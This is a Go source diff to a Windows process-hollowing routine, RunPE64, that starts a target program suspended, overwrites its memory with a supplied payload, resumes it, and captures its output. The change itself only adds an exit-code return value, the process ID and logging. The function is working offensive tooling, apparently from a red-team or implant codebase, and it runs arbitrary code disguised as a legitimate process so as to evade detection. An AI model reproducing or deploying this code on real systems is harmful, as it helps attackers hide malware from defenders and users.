@@ -8,6 +8,7 @@ import (
 	"syscall"
 	"unsafe"
 
+	log "github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
 )
 
@@ -175,27 +176,27 @@ func procPatch(processHandle uintptr, threadHandle uintptr, payload []byte) erro
 	return nil
 }
 
-func RunPE64(payload []byte, target string, replace string, commandLine string) (int, []byte, []byte, error) {
+func RunPE64(payload []byte, target string, replace string, commandLine string) (int, []byte, []byte, int, error) {
 	// Create anonymous pipe for STDIN
 	var stdInRead syscall.Handle
 	var stdInWrite syscall.Handle
 	errStdInPipe := syscall.CreatePipe(&stdInRead, &stdInWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdInPipe != nil {
-		return 0, nil, nil, fmt.Errorf("Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error())
+		return 0, nil, nil, 0, fmt.Errorf("Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error())
 	}
 	// Create anonymous pipe for STDOUT
 	var stdOutRead syscall.Handle
 	var stdOutWrite syscall.Handle
 	errStdOutPipe := syscall.CreatePipe(&stdOutRead, &stdOutWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdOutPipe != nil {
-		return 0, nil, nil, fmt.Errorf("Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error())
+		return 0, nil, nil, 0, fmt.Errorf("Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error())
 	}
 	// Create anonymous pipe for STDERR
 	var stdErrRead syscall.Handle
 	var stdErrWrite syscall.Handle
 	errStdErrPipe := syscall.CreatePipe(&stdErrRead, &stdErrWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdErrPipe != nil {
-		return 0, nil, nil, fmt.Errorf("Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error())
+		return 0, nil, nil, 0, fmt.Errorf("Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error())
 	}
 
 	// Process structures with the pipes, to get its output
@@ -211,27 +212,37 @@ func RunPE64(payload []byte, target string, replace string, commandLine string) 
 	// Create the process.
 	// Set inheritHandle = 1 so the pipes work!
 	// Add executable to commandline, or arg[0] will not be set...
-	ret, err := CreateProcessA_Pipe(target, replace+" "+commandLine, 0, 0, 1, 0x00000004, 0, 0, startupInfo, procInfo)
+	_, err := CreateProcessA_Pipe(target, replace+" "+commandLine, 0, 0, 1, 0x00000004, 0, 0, startupInfo, procInfo)
 	threadHandle := uintptr(procInfo.Thread)
 	processHandle := uintptr(procInfo.Process)
 
 	// Hollow it / Replace it with payload
 	err = procPatch(processHandle, threadHandle, payload)
 	if err != nil {
-		return 0, nil, nil, fmt.Errorf("Error patching process: %s", err.Error())
+		return 0, nil, nil, 0, fmt.Errorf("Error patching process: %s", err.Error())
 	}
 
 	// Start process
 	err = ResumeThread(threadHandle)
 	if err != nil && err.Error() != SUCCESS {
-		return 0, nil, nil, err
+		return 0, nil, nil, 0, err
+	}
+
+	// Wait for exitcode
+	syscall.WaitForSingleObject(procInfo.Process, 1000) // max 1s waiting
+	var exitCode uint32
+	err = syscall.GetExitCodeProcess(procInfo.Process, &exitCode)
+	if err != nil {
+		log.Errorf("Grabbing exit code error: %s", err.Error())
 	}
 
 	// Get output from process
 	err, stdOut, stdErr := procReadOutput(procInfo, stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite)
 	if err != nil {
-		return 0, nil, nil, err
+		return 0, nil, nil, 0, err
 	}
 
-	return int(ret), stdOut, stdErr, nil
+	pid := procInfo.ProcessId
+
+	return int(pid), stdOut, stdErr, int(exitCode), nil
 }
